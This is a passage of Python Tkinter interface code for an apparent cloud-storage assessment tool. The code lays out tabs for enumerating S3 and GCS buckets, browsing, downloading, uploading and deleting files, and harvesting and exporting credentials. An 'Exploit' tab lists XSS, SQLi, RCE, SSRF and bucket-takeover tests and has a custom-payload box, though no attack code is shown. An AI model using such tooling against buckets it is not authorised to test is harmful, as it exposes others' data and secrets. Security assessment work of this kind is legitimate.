        self.create_about_tab()
    
    def setup_status_bar(self):
        """Setup status bar with information"""
        self.status_bar = ttk.Frame(self.root)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Left side - Status message
        self.status_label = ttk.Label(self.status_bar, text="Ready", relief=tk.SUNKEN, anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Center - Progress bar
        self.status_progress = ttk.Progressbar(self.status_bar, mode='indeterminate', length=150, style='Accent.Horizontal.TProgressbar')
        self.status_progress.pack(side=tk.LEFT, padx=5)
        self.status_progress.pack_forget()
        
        # Right side - Stats
        self.bucket_count_label = ttk.Label(self.status_bar, text="Buckets: 0", relief=tk.SUNKEN)
        self.bucket_count_label.pack(side=tk.RIGHT)
        
        self.file_count_label = ttk.Label(self.status_bar, text="Files: 0", relief=tk.SUNKEN)
        self.file_count_label.pack(side=tk.RIGHT)
        
        self.cred_count_label = ttk.Label(self.status_bar, text="Credentials: 0", relief=tk.SUNKEN)
        self.cred_count_label.pack(side=tk.RIGHT)
        
        self.scan_time_label = ttk.Label(self.status_bar, text="", relief=tk.SUNKEN)
        self.scan_time_label.pack(side=tk.RIGHT)
    
    # ========================================================================
    # DASHBOARD TAB
    # ========================================================================
    
    def create_dashboard_tab(self):
        """Create main dashboard tab with statistics and quick actions"""
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="📊 Dashboard")
        
        # Header
        header_frame = ttk.Frame(self.dashboard_frame)
        header_frame.pack(fill=tk.X, padx=20, pady=20)
        
        title = ttk.Label(header_frame, text=f"{self.APP_NAME} v{self.VERSION}", style='Title.TLabel')
        title.pack()
        
        subtitle = ttk.Label(header_frame, text="Professional Cloud Storage Security Assessment Tool", 
                            style='Subheading.TLabel')
        subtitle.pack()
        
        # Stats cards
        stats_frame = ttk.Frame(self.dashboard_frame)
        stats_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.stats_cards = {}
        stats_data = [
            ("📦 Buckets", "0", self.colors['accent']),
            ("📄 Files", "0", self.colors['info']),
            ("🔑 Credentials", "0", self.colors['warning']),
            ("⚠️ Vulnerable", "0", self.colors['danger']),
            ("💣 Exploits", "0", self.colors['purple']),
            ("📊 Risk Score", "0", self.colors['orange']),
        ]
        
        for i, (label, value, color) in enumerate(stats_data):
            card = tk.Frame(stats_frame, bg='#1a1a1a', relief=tk.RAISED, bd=1, padx=15, pady=15)
            card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
            
            tk.Label(card, text=label, font=('Segoe UI', 11), bg='#1a1a1a', fg=self.colors['fg']).pack()
            value_label = tk.Label(card, text=value, font=('Segoe UI', 28, 'bold'), 
                                   bg='#1a1a1a', fg=color)
            value_label.pack()
            self.stats_cards[label] = value_label
        
        # Quick actions grid
        actions_frame = ttk.LabelFrame(self.dashboard_frame, text="⚡ Quick Actions")
        actions_frame.pack(fill=tk.X, padx=20, pady=10)
        
        actions_grid = ttk.Frame(actions_frame)
        actions_grid.pack(padx=10, pady=10)
        
        quick_actions = [
            ("🎯 Quick Scan", self.quick_scan, self.colors['accent']),
            ("🚀 Full Scan", self.full_scan, self.colors['info']),
            ("📁 Open File Manager", lambda: self.switch_to_tab(1), self.colors['purple']),
            ("💣 Exploit Tools", lambda: self.switch_to_tab(4), self.colors['danger']),
            ("🔑 Scan Credentials", self.open_credential_scanner, self.colors['warning']),
            ("📊 Generate Report", self.generate_full_report, self.colors['success']),
        ]
        
        for i, (text, cmd, color) in enumerate(quick_actions):
            btn = tk.Button(actions_grid, text=text, command=cmd, bg=color, fg='black',
                           font=('Segoe UI', 10, 'bold'), padx=20, pady=10, relief=tk.FLAT,
                           cursor='hand2')
            btn.grid(row=i//3, column=i%3, padx=10, pady=5, sticky='ew')
        
        for i in range(3):
            actions_grid.columnconfigure(i, weight=1)
        
        # Recent activity
        activity_frame = ttk.LabelFrame(self.dashboard_frame, text="📋 Recent Activity")
        activity_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.activity_text = scrolledtext.ScrolledText(activity_frame, height=8, bg='#0a0a0a', 
                                                        fg=self.colors['green'], font=('Consolas', 9))
        self.activity_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Recent buckets
        recent_frame = ttk.LabelFrame(self.dashboard_frame, text="📦 Recent Buckets")
        recent_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.recent_buckets_list = tk.Listbox(recent_frame, bg='#0a0a0a', fg=self.colors['cyan'],
                                              height=6, font=('Consolas', 10))
        self.recent_buckets_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.recent_buckets_list.bind('<Double-1>', self.on_recent_bucket_click)
    
    # ========================================================================
    # ENHANCED FILE MANAGER TAB
    # ========================================================================
    
    def create_file_manager_tab(self):
        """Create enhanced file manager tab with all features"""
        self.file_manager_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.file_manager_frame, text="📁 File Manager")
        
        # === TOP BAR ===
        top_bar = ttk.Frame(self.file_manager_frame)
        top_bar.pack(fill=tk.X, padx=10, pady=10)
        
        # Bucket selector
        ttk.Label(top_bar, text="Bucket:", style='Heading.TLabel').pack(side=tk.LEFT, padx=(0,5))
        
        self.fm_bucket_var = tk.StringVar()
        self.fm_bucket_combo = ttk.Combobox(top_bar, textvariable=self.fm_bucket_var, width=40)
        self.fm_bucket_combo.pack(side=tk.LEFT, padx=5)
        self.fm_bucket_combo.bind('<<ComboboxSelected>>', lambda e: self.fm_load_bucket())
        
        ttk.Button(top_bar, text="🔍 Load", command=self.fm_load_bucket, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(top_bar, text="🔄 Refresh", command=self.fm_refresh_bucket).pack(side=tk.LEFT, padx=5)
        ttk.Button(top_bar, text="➕ Add Bucket", command=self.fm_add_bucket).pack(side=tk.LEFT, padx=5)
        ttk.Button(top_bar, text="📊 Stats", command=self.fm_show_stats).pack(side=tk.LEFT, padx=5)
        
        # Search
        ttk.Label(top_bar, text="🔎 Search:", style='Heading.TLabel').pack(side=tk.LEFT, padx=(20,5))
        self.fm_search_var = tk.StringVar()
        self.fm_search_var.trace_add('write', lambda *a: self.fm_filter_files())
        search_entry = ttk.Entry(top_bar, textvariable=self.fm_search_var, width=30)
        search_entry.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(top_bar, text="❌ Clear", command=lambda: self.fm_search_var.set("")).pack(side=tk.LEFT, padx=2)
        
        # === MAIN PANEL ===
        main_panel = ttk.PanedWindow(self.file_manager_frame, orient=tk.HORIZONTAL)
        main_panel.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # LEFT PANEL - Folder tree
        left_frame = ttk.LabelFrame(main_panel, text="📂 Folder Structure")
        main_panel.add(left_frame, weight=1)
        
        self.fm_tree = ttk.Treeview(left_frame, selectmode='browse')
        self.fm_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        tree_scroll_y = ttk.Scrollbar(left_frame, orient=tk.VERTICAL, command=self.fm_tree.yview)
        tree_scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        self.fm_tree.configure(yscrollcommand=tree_scroll_y.set)
        
        self.fm_tree.bind('<<TreeviewSelect>>', self.fm_on_tree_select)
        self.fm_tree.bind('<Double-1>', self.fm_on_tree_double_click)
        
        # RIGHT PANEL - File list and editor
        right_panel = ttk.PanedWindow(main_panel, orient=tk.VERTICAL)
        main_panel.add(right_panel, weight=2)
        
        # File list with toolbar
        files_frame = ttk.LabelFrame(right_panel, text="📄 Files")
        right_panel.add(files_frame, weight=1)
        
        file_toolbar = ttk.Frame(files_frame)
        file_toolbar.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(file_toolbar, text="📥 Download", command=self.fm_download_selected).pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="🗑 Delete", command=self.fm_delete_selected, style='Danger.TButton').pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="📤 Upload", command=self.fm_upload_file).pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="📁 New Folder", command=self.fm_new_folder).pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="🔐 Scan", command=self.fm_scan_credentials).pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="🌐 Open", command=self.fm_open_in_browser).pack(side=tk.LEFT, padx=2)
        ttk.Button(file_toolbar, text="📋 Copy Path", command=self.fm_copy_path).pack(side=tk.LEFT, padx=2)
        
        # Files tree
        columns = ("Size", "Modified", "Type", "Hash")
        self.fm_files_tree = ttk.Treeview(files_frame, columns=columns, show='tree headings', height=15)
        self.fm_files_tree.heading("#0", text="File Name")
        self.fm_files_tree.heading("Size", text="Size")
        self.fm_files_tree.heading("Modified", text="Last Modified")
        self.fm_files_tree.heading("Type", text="Type")
        self.fm_files_tree.heading("Hash", text="MD5")
        
        self.fm_files_tree.column("#0", width=400)
        self.fm_files_tree.column("Size", width=100)
        self.fm_files_tree.column("Modified", width=180)
        self.fm_files_tree.column("Type", width=100)
        self.fm_files_tree.column("Hash", width=150)
        
        files_scroll_y = ttk.Scrollbar(files_frame, orient=tk.VERTICAL, command=self.fm_files_tree.yview)
        files_scroll_x = ttk.Scrollbar(files_frame, orient=tk.HORIZONTAL, command=self.fm_files_tree.xview)
        self.fm_files_tree.configure(yscrollcommand=files_scroll_y.set, xscrollcommand=files_scroll_x.set)
        
        self.fm_files_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        files_scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        files_scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.fm_files_tree.bind('<Double-1>', self.fm_edit_file)
        self.fm_files_tree.bind('<Button-3>', self.fm_show_context_menu)
        
        # File editor
        editor_frame = ttk.LabelFrame(right_panel, text="✏️ File Editor")
        right_panel.add(editor_frame, weight=1)
        
        editor_toolbar = ttk.Frame(editor_frame)
        editor_toolbar.pack(fill=tk.X, padx=5, pady=5)
        
        self.fm_current_file_var = tk.StringVar(value="No file selected")
        ttk.Label(editor_toolbar, textvariable=self.fm_current_file_var, foreground=self.colors['cyan']).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(editor_toolbar, text="💾 Save", command=self.fm_save_file, style='Success.TButton').pack(side=tk.RIGHT, padx=2)
        ttk.Button(editor_toolbar, text="🔄 Reload", command=self.fm_reload_file).pack(side=tk.RIGHT, padx=2)
        ttk.Button(editor_toolbar, text="🔍 Find", command=self.fm_find_in_file).pack(side=tk.RIGHT, padx=2)
        ttk.Button(editor_toolbar, text="🔄 Replace", command=self.fm_replace_in_file).pack(side=tk.RIGHT, padx=2)
        ttk.Button(editor_toolbar, text="📋 Copy", command=self.fm_copy_all).pack(side=tk.RIGHT, padx=2)
        
        # Text editor
        self.fm_editor = scrolledtext.ScrolledText(editor_frame, bg='#1e1e1e', fg='#d4d4d4',
                                                    font=('Consolas', 10), wrap=tk.WORD,
                                                    undo=True, autoseparators=True, maxundo=100)
        self.fm_editor.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Syntax highlighting tags
        self.fm_editor.tag_config('keyword', foreground='#569cd6')
        self.fm_editor.tag_config('string', foreground='#ce9178')
        self.fm_editor.tag_config('comment', foreground='#6a9955')
        self.fm_editor.tag_config('number', foreground='#b5cea8')
        self.fm_editor.tag_config('function', foreground='#dcdcaa')
        self.fm_editor.tag_config('class', foreground='#4ec9b0')
        self.fm_editor.tag_config('decorator', foreground='#c8c8c8')
        self.fm_editor.tag_config('credential', background='#ff0000', foreground='#ffffff')
        self.fm_editor.tag_config('search', background='#ffff00', foreground='#000000')
        
        # Status bar
        self.fm_status_var = tk.StringVar(value="Ready")
        status_label = ttk.Label(self.file_manager_frame, textvariable=self.fm_status_var, 
                                  foreground=self.colors['accent'])
        status_label.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)
        
        # Progress bar
        self.fm_progress = ttk.Progressbar(self.file_manager_frame, mode='indeterminate', 
                                           style='Accent.Horizontal.TProgressbar')
        self.fm_progress.pack(fill=tk.X, padx=10, pady=5)
        
        # Initialize data
        self.fm_current_bucket: Optional[BucketInfo] = None
        self.fm_current_path = ""
        self.fm_current_edit_file = None
        self.fm_all_files: List[FileInfo] = []
        self.fm_filtered_files: List[FileInfo] = []
        self.fm_folder_tree = {}
    
    # ========================================================================
    # BUCKET BROWSER TAB
    # ========================================================================
    
    def create_bucket_browser_tab(self):
        """Create bucket browser tab"""
        self.browser_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.browser_frame, text="🔍 Bucket Browser")
        
        # Toolbar
        toolbar = ttk.Frame(self.browser_frame)
        toolbar.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(toolbar, text="Bucket:", style='Heading.TLabel').pack(side=tk.LEFT)
        self.browser_bucket_var = tk.StringVar()
        self.browser_bucket_combo = ttk.Combobox(toolbar, textvariable=self.browser_bucket_var, width=40)
        self.browser_bucket_combo.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(toolbar, text="🔍 Load", command=self.browser_load_bucket, style='Primary.TButton').pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="🔄 Refresh", command=self.browser_refresh).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="📊 Stats", command=self.browser_show_stats).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="📥 Download All", command=self.browser_download_all).pack(side=tk.LEFT, padx=2)
        ttk.Button(toolbar, text="🔐 Scan All", command=self.browser_scan_all).pack(side=tk.LEFT, padx=2)
        
        # Search
        ttk.Label(toolbar, text="Filter:").pack(side=tk.LEFT, padx=(20,5))
        self.browser_filter_var = tk.StringVar()
        self.browser_filter_var.trace_add('write', lambda *a: self.browser_filter_files())
        ttk.Entry(toolbar, textvariable=self.browser_filter_var, width=30).pack(side=tk.LEFT, padx=5)
        
        # File tree
        self.browser_tree = ttk.Treeview(self.browser_frame, columns=("Size", "Modified", "Type"), show='tree headings')
        self.browser_tree.heading("#0", text="File Name")
        self.browser_tree.heading("Size", text="Size")
        self.browser_tree.heading("Modified", text="Last Modified")
        self.browser_tree.heading("Type", text="Type")
        
        self.browser_tree.column("#0", width=500)
        self.browser_tree.column("Size", width=120)
        self.browser_tree.column("Modified", width=180)
        self.browser_tree.column("Type", width=100)
        
        scroll_y = ttk.Scrollbar(self.browser_frame, orient=tk.VERTICAL, command=self.browser_tree.yview)
        scroll_x = ttk.Scrollbar(self.browser_frame, orient=tk.HORIZONTAL, command=self.browser_tree.xview)
        self.browser_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.browser_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=5)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.browser_tree.bind('<Double-1>', self.browser_open_file)
        self.browser_tree.bind('<Button-3>', self.browser_context_menu)
    
    # ========================================================================
    # SCAN TAB
    # ========================================================================
    
    def create_scan_tab(self):
        """Create scan configuration tab"""
        self.scan_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.scan_frame, text="🎯 Scan")
        
        # Target configuration
        target_frame = ttk.LabelFrame(self.scan_frame, text="Target Configuration")
        target_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(target_frame, text="Domain or Base Name:", style='Heading.TLabel').pack(anchor=tk.W, padx=10, pady=(10,0))
        self.scan_target_var = tk.StringVar(value="")
        ttk.Entry(target_frame, textvariable=self.scan_target_var, font=('Consolas', 12), width=50).pack(padx=10, pady=5, fill=tk.X)
        
        ttk.Label(target_frame, text="Provider:", style='Heading.TLabel').pack(anchor=tk.W, padx=10, pady=(10,0))
        self.scan_provider_var = tk.StringVar(value="All")
        provider_combo = ttk.Combobox(target_frame, textvariable=self.scan_provider_var, 
                                       values=["AWS S3 (Amazon)", "Google GCS", "All"], width=24)
        provider_combo.pack(anchor=tk.W, padx=10, pady=5)
        
        # Wordlist
        ttk.Label(target_frame, text="Custom Wordlist:", style='Heading.TLabel').pack(anchor=tk.W, padx=10, pady=(10,0))
        wordlist_frame = ttk.Frame(target_frame)
        wordlist_frame.pack(fill=tk.X, padx=10, pady=5)
        self.wordlist_var = tk.StringVar()
        ttk.Entry(wordlist_frame, textvariable=self.wordlist_var).pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(wordlist_frame, text="Browse", command=self.browse_wordlist).pack(side=tk.RIGHT, padx=5)
        
        # Scan options
        options_frame = ttk.LabelFrame(self.scan_frame, text="Scan Options")
        options_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.scan_deep_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Deep Scan (check all files)", variable=self.scan_deep_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.scan_creds_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Extract Credentials", variable=self.scan_creds_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.scan_urls_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Extract URLs", variable=self.scan_urls_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.scan_emails_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Extract Emails", variable=self.scan_emails_var).pack(anchor=tk.W, padx=10, pady=5)
        
        self.scan_hashes_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="Calculate File Hashes", variable=self.scan_hashes_var).pack(anchor=tk.W, padx=10, pady=5)
        
        # Control buttons
        control_frame = ttk.Frame(self.scan_frame)
        control_frame.pack(fill=tk.X, padx=20, pady=20)
        
        self.scan_start_btn = ttk.Button(control_frame, text="🚀 Start Scan", command=self.start_scan, style='Success.TButton')
        self.scan_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.scan_stop_btn = ttk.Button(control_frame, text="⏹️ Stop", command=self.stop_scan, state=tk.DISABLED, style='Danger.TButton')
        self.scan_stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.scan_pause_btn = ttk.Button(control_frame, text="⏸️ Pause", command=self.pause_scan, state=tk.DISABLED)
        self.scan_pause_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.scan_progress = ttk.Progressbar(self.scan_frame, mode='determinate', style='Accent.Horizontal.TProgressbar')
        self.scan_progress.pack(fill=tk.X, padx=20, pady=10)
        
        self.scan_status_var = tk.StringVar(value="Ready")
        ttk.Label(self.scan_frame, textvariable=self.scan_status_var, foreground=self.colors['accent']).pack(pady=5)
        
        # Results preview
        results_frame = ttk.LabelFrame(self.scan_frame, text="Scan Results Preview")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.scan_results_text = scrolledtext.ScrolledText(results_frame, height=15, bg='#0a0a0a', fg=self.colors['green'], font=('Consolas', 9))
        self.scan_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
    
    # ========================================================================
    # EXPLOIT TAB
    # ========================================================================
    
    def create_exploit_tab(self):
        """Create exploit testing tab"""
        self.exploit_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.exploit_frame, text="💣 Exploit")
        
        # Left panel - Exploit selection
        left_panel = ttk.LabelFrame(self.exploit_frame, text="Exploit Selection")
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        exploits = [
            ("🔐 Write Access Test", self.test_write_exploit, "Test if bucket allows file uploads"),
            ("🗑️ Delete Access Test", self.test_delete_exploit, "Test if bucket allows file deletion"),
            ("🌐 Website Hosting Test", self.test_website_hosting, "Test if bucket hosts a website"),
            ("🎯 Bucket Takeover Test", self.test_bucket_takeover, "Test if bucket can be taken over"),
            ("💉 XSS Injection", self.xss_injection, "Test for XSS vulnerabilities"),
            ("🗄️ SQL Injection", self.sqli_test, "Test for SQL injection"),
            ("📁 LFI/RFI Test", self.lfi_test, "Test for file inclusion"),
            ("⚙️ RCE Test", self.rce_test, "Test for remote code execution"),
            ("🔄 Open Redirect", self.test_open_redirect, "Test for open redirect"),
            ("🔗 SSRF Test", self.test_ssrf, "Test for server-side request forgery"),
        ]
        
        for text, cmd, desc in exploits:
            btn_frame = ttk.Frame(left_panel)
            btn_frame.pack(fill=tk.X, padx=10, pady=5)
            
            btn = tk.Button(btn_frame, text=text, command=cmd, bg='#1a1a1a', fg=self.colors['cyan'],
                           font=('Segoe UI', 10), padx=10, pady=5, relief=tk.FLAT, cursor='hand2',
                           width=25)
            btn.pack(side=tk.LEFT)
            
            ttk.Label(btn_frame, text=desc, foreground=self.colors['fg']).pack(side=tk.LEFT, padx=10)
        
        # Right panel - Results
        right_panel = ttk.LabelFrame(self.exploit_frame, text="Exploit Results")
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.exploit_results_text = scrolledtext.ScrolledText(right_panel, height=25, bg='#0a0a0a', fg=self.colors['yellow'], font=('Consolas', 9))
        self.exploit_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Bottom panel - Custom payload
        bottom_panel = ttk.LabelFrame(self.exploit_frame, text="Custom Payload")
        bottom_panel.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=10)
        
        ttk.Label(bottom_panel, text="Payload:").pack(anchor=tk.W, padx=10)
        self.custom_payload_var = tk.StringVar()
        ttk.Entry(bottom_panel, textvariable=self.custom_payload_var, width=80).pack(padx=10, pady=5, fill=tk.X)
        
        ttk.Button(bottom_panel, text="Execute Custom Payload", command=self.execute_custom_payload, style='Warning.TButton').pack(pady=5)
    
    # ========================================================================
    # RESULTS TAB
    # ========================================================================
    
    def create_results_tab(self):
        """Create results display tab"""
        self.results_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.results_frame, text="📊 Results")
        
        # Toolbar
        toolbar = ttk.Frame(self.results_frame)
        toolbar.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(toolbar, text="Filter:").pack(side=tk.LEFT, padx=5)
        self.results_filter_var = tk.StringVar()
        self.results_filter_var.trace_add('write', lambda *a: self.filter_results())
        ttk.Entry(toolbar, textvariable=self.results_filter_var, width=30).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(toolbar, text="📊 Summary", command=self.show_summary).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="📄 Export CSV", command=self.export_csv).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🗑 Clear All", command=self.clear_results, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🔄 Refresh", command=self.update_results_tab).pack(side=tk.LEFT, padx=5)

        self.results_hide_no_perm_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(
            toolbar,
            text="Hide no-permission buckets",
            variable=self.results_hide_no_perm_var,
            command=self.filter_results
        ).pack(side=tk.LEFT, padx=(12, 5))
        
        # Results tree
        columns = ("Bucket", "Provider", "Region", "Files", "Size", "Permissions", "Credentials", "Risk", "URL")
        self.results_tree = ttk.Treeview(self.results_frame, columns=columns, show='headings', height=20, style='Results.Treeview')
        
        for col in columns:
            self.results_tree.heading(col, text=col)
        
        self.results_tree.column("Bucket", width=250)
        self.results_tree.column("Provider", width=120)
        self.results_tree.column("Region", width=100)
        self.results_tree.column("Files", width=80)
        self.results_tree.column("Size", width=100)
        self.results_tree.column("Permissions", width=120)
        self.results_tree.column("Credentials", width=80)
        self.results_tree.column("Risk", width=80)
        self.results_tree.column("URL", width=400)
        
        scroll_y = ttk.Scrollbar(self.results_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        scroll_x = ttk.Scrollbar(self.results_frame, orient=tk.HORIZONTAL, command=self.results_tree.xview)
        self.results_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=5)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.results_tree.bind('<Double-1>', self.open_bucket_from_results)
        self.results_tree.bind('<Button-3>', self.results_context_menu)

        # Permission risk tags colors
        self.results_tree.tag_configure('perm_safe', background='#16321d', foreground='#c7ffd5')
        self.results_tree.tag_configure('perm_read', background='#1d2f3f', foreground='#d7ecff')
        self.results_tree.tag_configure('perm_write', background='#4a2e00', foreground='#ffe7b3')
        self.results_tree.tag_configure('perm_modify', background='#4a1111', foreground='#ffd6d6')
    
    # ========================================================================
    # CREDENTIAL TAB
    # ========================================================================
    
    def create_credential_tab(self):
        """Create credentials display tab"""
        self.cred_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.cred_frame, text="🔑 Credentials")
        
        # Toolbar
        toolbar = ttk.Frame(self.cred_frame)
        toolbar.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(toolbar, text="📋 Copy Selected", command=self.copy_selected_credential).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🗑 Clear All", command=self.clear_credentials, style='Danger.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="📄 Export", command=self.export_credentials_to_file).pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="🔍 Validate", command=self.validate_selected_credential).pack(side=tk.LEFT, padx=5)
        
        # Credentials tree
        columns = ("Bucket", "File", "Type", "Value", "Severity", "Found")
        self.cred_tree = ttk.Treeview(self.cred_frame, columns=columns, show='headings', height=25)
        
        for col in columns:
            self.cred_tree.heading(col, text=col)
        
        self.cred_tree.column("Bucket", width=200)
        self.cred_tree.column("File", width=250)
        self.cred_tree.column("Type", width=150)
        self.cred_tree.column("Value", width=300)
        self.cred_tree.column("Severity", width=80)
        self.cred_tree.column("Found", width=150)
        
        scroll_y = ttk.Scrollbar(self.cred_frame, orient=tk.VERTICAL, command=self.cred_tree.yview)
        scroll_x = ttk.Scrollbar(self.cred_frame, orient=tk.HORIZONTAL, command=self.cred_tree.xview)
        self.cred_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.cred_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Tag colors for severity
        self.cred_tree.tag_configure('critical', background='#8B0000', foreground='white')
        self.cred_tree.tag_configure('high', background='#FF4444', foreground='white')
        self.cred_tree.tag_configure('medium', background='#FFAA00', foreground='black')
        self.cred_tree.tag_configure('low', background='#4488FF', foreground='white')
    
    # ========================================================================
    # VULNERABILITY TAB
    # ========================================================================
    
    def create_vulnerability_tab(self):
        """Create vulnerability display tab"""
        self.vuln_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.vuln_frame, text="⚠️ Vulnerabilities")
        
        # Toolbar
        toolbar = ttk.Frame(self.vuln_frame)
        toolbar.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(toolbar, text="🔄 Scan Vulnerabilities", command=self.scan_vulnerabilities, style='Primary.TButton').pack(side=tk.LEFT, padx=5)
        ttk.Button(toolbar, text="📄 Export Report", command=self.export_vulnerability_report).pack(side=tk.LEFT, padx=5)
        
        # Vulnerabilities tree
        columns = ("Bucket", "Vulnerability", "Severity", "Details", "Discovered")
        self.vuln_tree = ttk.Treeview(self.vuln_frame, columns=columns, show='headings', height=25)
        
        for col in columns:
            self.vuln_tree.heading(col, text=col)
        
        self.vuln_tree.column("Bucket", width=200)
        self.vuln_tree.column("Vulnerability", width=200)
        self.vuln_tree.column("Severity", width=100)
        self.vuln_tree.column("Details", width=500)
        self.vuln_tree.column("Discovered", width=150)
        
        scroll_y = ttk.Scrollbar(self.vuln_frame, orient=tk.VERTICAL, command=self.vuln_tree.yview)
        scroll_x = ttk.Scrollbar(self.vuln_frame, orient=tk.HORIZONTAL, command=self.vuln_tree.xview)
        self.vuln_tree.configure(yscrollcommand=scroll_y.set, xscrollcommand=scroll_x.set)
        
        self.vuln_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        # Severity tags
        self.vuln_tree.tag_configure('critical', background='#8B0000', foreground='white')
        self.vuln_tree.tag_configure('high', background='#FF4444', foreground='white')
        self.vuln_tree.tag_configure('medium', background='#FFAA00', foreground='black')
        self.vuln_tree.tag_configure('low', background='#4488FF', foreground='white')
    
    # ========================================================================
    # TOOLS TAB
    # ========================================================================
    
    def create_tools_tab(self):
        """Create tools tab with all utilities"""
        self.tools_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.tools_frame, text="🛠️ Tools")
        
        # Create notebook for tool categories
        tools_notebook = ttk.Notebook(self.tools_frame)
        tools_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Cryptography tools
        crypto_frame = ttk.Frame(tools_notebook)
        tools_notebook.add(crypto_frame, text="🔐 Cryptography")
        self.create_crypto_tools(crypto_frame)
        
        # Encoding tools
        encoding_frame = ttk.Frame(tools_notebook)
        tools_notebook.add(encoding_frame, text="📝 Encoding")
        self.create_encoding_tools(encoding_frame)
        
        # Network tools
        network_frame = ttk.Frame(tools_notebook)
        tools_notebook.add(network_frame, text="🌐 Network")
        self.create_network_tools(network_frame)
        
        # Analysis tools
        analysis_frame = ttk.Frame(tools_notebook)
        tools_notebook.add(analysis_frame, text="🔬 Analysis")
        self.create_analysis_tools(analysis_frame)
        
        # Generation tools
        generation_frame = ttk.Frame(tools_notebook)
